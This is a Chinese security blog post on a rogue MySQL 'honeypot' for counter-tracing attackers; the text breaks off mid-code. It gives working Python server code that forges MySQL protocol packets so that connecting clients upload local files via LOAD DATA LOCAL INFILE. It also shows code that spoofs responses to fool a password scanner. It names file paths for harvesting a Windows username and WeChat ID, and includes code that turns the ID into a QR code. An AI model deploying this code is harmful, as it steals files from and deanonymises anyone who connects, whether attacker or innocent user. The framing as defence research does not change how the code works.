溯源反制之MySQL蜜罐研究
原创雪狼别动队 酒仙桥六号部队
2021-01-05原文
这是 酒仙桥六号部队 的第 142 篇文章。
全文共计12732个字，预计阅读时长33分钟。
前言
前不久，零队发了一篇《MySQL蜜罐获取攻击者微信ID》的文章，文章讲述了
如 何 通 过 load data local
infile进行攻击者微信ID的抓取，学习的过程中发现虽然问题是一个比较老
的问题，但是扩展出来的很多知识都比较有意思，记录一下。
分析过程
LOAD DATA INFILE
在 MySQL 中 LOAD DATA INFILE
语句以非常高的速度从文本文件中读取行到表中，基本语法如下：
load data [low_priority] [local] infile 'file_name txt'
[replace | ignore]
into table tbl_name
[fields
[terminated by't']
[OPTIONALLY] enclosed by '']
[escaped by'\' ]]
[lines terminated by'n']
[ignore number lines]
[(col_name, )]
这个功能默认是关闭的，当我们没有开启这个功能时执行LOAD DATA
INFILE报错如下：
> 1148 - The used command is not allowed with this MySQL version
我们可以通过如下命令查看功能状态。
show global variables like 'local_infile';
我们可以通过如下命令开启该功能。
set global local_infile=1;
开启之后我们就可以通过如下命令进行文件读取并且写入到表中，我们以C:\1
.txt为例，将其中内容写入到test表中，并且以\n为分隔符。
load data local infile 'C:/1.txt' into table test fields
terminated by '\n';
这样我们就可以读取客户端本地的文件，并写入到表中。
通信过程
接下来我们通过Wireshark抓取过程中的流量分析一下通信过程。
首先是Greeting包，返回了服务端的Version等信息。
接下来客户端发送登录请求。
接下来客户端发送了如下请求：
SET NAMES utf8mb4SET NAMES utf8mb4
接下来我们执行我们的payload
load data local infile 'C:/1.txt' into table test fields
terminated by '\n';
首先客户端发起请求；
之后服务端会回复一个Response TABULAR，其中包含请求文件名的包；
这里数据包我们要注意的地方如下：
如上图，数据包中内容如下：
09 00 00 01 fb 43 3a 2f 31 2e 74 78 74
这里的09指的是从fb开始十六进制的数据包中文件名的长度，00 00
01 值 得 是 数 据 包 的 序 号 ， fb 是 包 的 类 型 ， 43 4a 2f 31 2e 74 78
74指的是文件名，接下来客户端向服务端发送文件内容的数据包。
任意文件读取过程
在MySQL协议中，客户端本身不存储自身的请求，而是通过服务端的响应来执
行操作，也就是说我们如果可以伪造Greeting包和伪造的文件名对应的数据
包，我们就可以让攻击者的客户端给我们把我们想要的文件拿过来，过程大致
如下，首先我们将Greeting包发送给要连接的客户端，这样如果客户端发送
查 询 之 后 ， 我 们 返 回 一 个 Response
TABULAR数据包，并且附上我们指定的文件，我们也就完成了整个任意文件读
取的过程，接下来就是构造两个包的过程，首先是Greeting包，这里引用lig
htless师傅博客中的一个样例。
'\x0a', # Protocol
'6.6.6-lightless_Mysql_Server' + '\0', # Version
'\x36\x00\x00\x00', # Thread ID
'ABCDABCD' + '\0', # Salt
'\xff\xf7', # Capabilities, CLOSE SSL HERE!
'\x08', # Collation
'\x02\x00', # Server Status
"\x0f\x80\x15",
'\0' * 10, # Unknown
'ABCDABCD' + '\0',
"mysql_native_password" + "\0"
根据以上样例，我们就可以方便的构造Greeting包了，当然，这里我们也可
以直接利用上面我们Wireshark抓取到的Greeting包，接下来就是Response
TABULAR包了，包的格式上面我们分析过了，我们可以直接构造如下Paylod
chr(len(filename) + 1) + "\x00\x00\x01\xFB" + filename
我们就可以对客户端的指定文件进行读取了，这里我们还缺少一个条件，RUSS
IANSECURITY在博客中也提及过如下内容。
For successfully exploitation you need at least one query
to server. Fortunately most of mysql clients makes at
least one query like ‘*SET names “utf8”* or something.
这是因为我们传输这个文件读取的数据包时，需要等待一个来自客户端的查询
请求才能回复这个读文件的请求，也就是我们现在还需要一个来自客户端的查
询请求，幸运的是，通过我们上面的分析我们可以看到，形如Navicat等客户
端进行连接的时候，会自动发送如下查询请求。
SET NAMES utf8mb4
从查阅资料来看，大多数MySQL客户端以及程序库都会在握手之后至少发送一
次请求，以探测目标平台的指纹信息，例如：
select @@version_comment limit 1
这样我们的利用条件也就满足了，综上，我们可以恶意模拟一个MySQL服务端
的身份认证过程，之后等待客户端发起一个SQL查询，之后响应的时候我们将
我们构造的Response TABULAR发送给客户端，也就是我们LOAD DATA
INFILE的请求，这样客户端根据响应内容执行上传本机文件的操作，我们也就
获得了攻击者的文件信息，整体流程图示如下：
我们可以用Python来简单模拟一下这个过程:
import socket
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 3306
serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
1)
serversocket.bind(("", port))
serversocket.listen(5)
while True:
# 建立客户端连接
clientsocket,addr = serversocket.accept()
print("连接地址: %s" % str(addr))
# 返回版本信息
version_text =
b"\x4a\x00\x00\x00\x0a\x38\x2e\x30\x2e\x31\x32\x00\x08\x00\x00\x
00\x2a\x51\x47\x38\x48\x17\x12\x21\x00\xff\xff\xc0\x02\x00\xff\x
c3\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7a\x6f\x6e\x25\x
61\x3e\x48\x31\x25\x43\x2b\x61\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x
61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
clientsocket.sendall(version_text)
try:
# 客户端请求信息
clientsocket.recv(9999)
except Exception as e:
print(e)
# Response OK
verification =
b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"
clientsocket.sendall(verification)
try:
# SET NAMES utf8mb4
clientsocket.recv(9999)
except Exception as e:
print(e)
# Response TABULAR
evil_response =
b"\x09\x00\x00\x01\xfb\x43\x3a\x2f\x31\x2e\x74\x78\x74"
clientsocket.sendall(evil_response)
# file_text
print(clientsocket.recv(9999))
clientsocket.close()
我们可以看到，当攻击者链接我们构造的蜜罐时，我们成功抓取到了攻击者C:
/1.txt文件中的内容，接下来就是对任意文件的构造，我们上面也分析了Res
ponse
TABULAR数据包的格式，因此我们只需要对我们的文件名进行构造即可，这里
不再赘述。
chr(len(filename) + 1) + "\x00\x00\x01\xFB" + filename
欺骗扫描器
接下来一个主要问题就是让攻击者的扫描器发现我们是弱口令才行，这样他才
有可能连接，所以还需要分析一下扫描器的通信过程，这里以SNETCracker为
例。
首先还是分析通信过程，首先还是Greeting包，返回版本信息等。
之后客户端向服务端发送请求登录的数据包。
接下来服务端向客户端返回验证成功的数据包。
从上面流程上来说，其实检查口令的部分已经结束了，但是这个软件本身还进
行了下面的进一步判断，当下面判断条件也成立时，才会认为成功爆破了MySQ
L，接下来查看系统变量以及相应的值。
SHOW VARIABLES
服务端返回响应包后，继续查看警告信息。
SHOW WARNINGS
服务端返回响应包后，继续查看所有排列字符集。
SHOW COLLATION
到这里，如果我们伪造的蜜罐都可以返回相应的响应包，这时候SNETCracker
就可以判断弱口令存在，并正常识别了，我们使用Python模拟一下整个过程。
import socket
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 3306
serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
1)
serversocket.bind(("", port))
serversocket.listen(5)
# 建立客户端连接
clientsocket,addr = serversocket.accept()
print("连接地址: %s" % str(addr))
# 返回版本信息
version_text =
b"\x4a\x00\x00\x00\x0a\x38\x2e\x30\x2e\x31\x32\x00\x08\x00\x00\x
00\x34\x58\x29\x37\x38\x2f\x6d\x20\x00\xff\xff\xc0\x02\x00\xff\x
c3\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x1f\x07\x48\x
54\x56\x3f\x1e\x15\x2a\x58\x59\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x
61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
clientsocket.sendall(version_text)
print(clientsocket.recv(9999))
verification = b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"
clientsocket.sendall(verification)
print(clientsocket.recv(9999))
show_variables = b'太长了，已经省略'
clientsocket.sendall(show_variables)
print(clientsocket.recv(9999))
show_warnings =
b"\x01\x00\x00\x01\x03\x1b\x00\x00\x02\x03\x64\x65\x66\x00\x00\x
00\x05\x4c\x65\x76\x65\x6c\x00\x0c\x08\x00\x07\x00\x00\x00\xfd\x
01\x00\x1f\x00\x00\x1a\x00\x00\x03\x03\x64\x65\x66\x00\x00\x00\x
04\x43\x6f\x64\x65\x00\x0c\x3f\x00\x04\x00\x00\x00\x03\xa1\x00\x
00\x00\x00\x1d\x00\x00\x04\x03\x64\x65\x66\x00\x00\x00\x07\x4d\x
65\x73\x73\x61\x67\x65\x00\x0c\x08\x00\x00\x02\x00\x00\xfd\x01\x
00\x1f\x00\x00\x05\x00\x00\x05\xfe\x00\x00\x02\x00\x68\x00\x00\x
06\x07\x57\x61\x72\x6e\x69\x6e\x67\x04\x31\x33\x36\x36\x5a\x49\x
6e\x63\x6f\x72\x72\x65\x63\x74\x20\x73\x74\x72\x69\x6e\x67\x20\x
76\x61\x6c\x75\x65\x3a\x20\x27\x5c\x78\x44\x36\x5c\x78\x44\x30\x
5c\x78\x42\x39\x5c\x78\x46\x41\x5c\x78\x42\x31\x5c\x78\x45\x41\x
2e\x2e\x2e\x27\x20\x66\x6f\x72\x20\x63\x6f\x6c\x75\x6d\x6e\x20\x
27\x56\x41\x52\x49\x41\x42\x4c\x45\x5f\x56\x41\x4c\x55\x45\x27\x
20\x61\x74\x20\x72\x6f\x77\x20\x31\x05\x00\x00\x07\xfe\x00\x00\x
02\x00"
clientsocket.sendall(show_warnings)
print(clientsocket.recv(9999))
show_collation = b'太长了，已经省略'
clientsocket.sendall(show_collation)
print(clientsocket.recv(9999))
至此我们欺骗扫描器的过程已经结束，攻击者已经可以“快速”的扫描到我们
的蜜罐了，只要他进行连接，我们就可以按照上面的方法来读取他电脑上的文
件了。
获取微信
如果我们想进行溯源，就需要获取一些能证明攻击者身份信息的文件，而且这
些文件需要位置类型固定，从而我们能方便的进行获取，从而进行进一步的调
查反制。
alexo0师傅在文章中提到过关于微信的抓取：
Windows下，微信默认的配置文件放在C:\Users\username\Documents\
WeChat Files\ 中 ， 在 里 面 翻 翻 能 够 发 现
C:\Users\username\Documents\WeChat Files\All
Users\config\config.data
中含有微信ID，而获取这个文件还需要一个条件，那就是要知道攻击者的
电脑用户名，用户名一般有可能出现在一些日志文件里，我们需要寻找一
些比较通用、文件名固定的文件。经过测试，发现一般用过一段时间的电
脑在 C:\Windows\PFRO.log 中较大几率能找到用户名。
通过以上条件我们就能获得攻击者的wxid了，接下来就是如何将wxid转换为
二维码方便我们扫描，通过资料得知方法如下：
weixin://contacts/profile/{wxid}
将相应wxid填入上述字符串后，再对字符串转换成二维码，之后使用安卓端微
信进行扫码即可，可以使用如下函数进行二维码生成：
import qrcode
from PIL import Image
import os
# 生成二维码图片
# 参数为wxid和二维码要保存的文件名
def make_qr(str,save):
qr=qrcode.QRCode(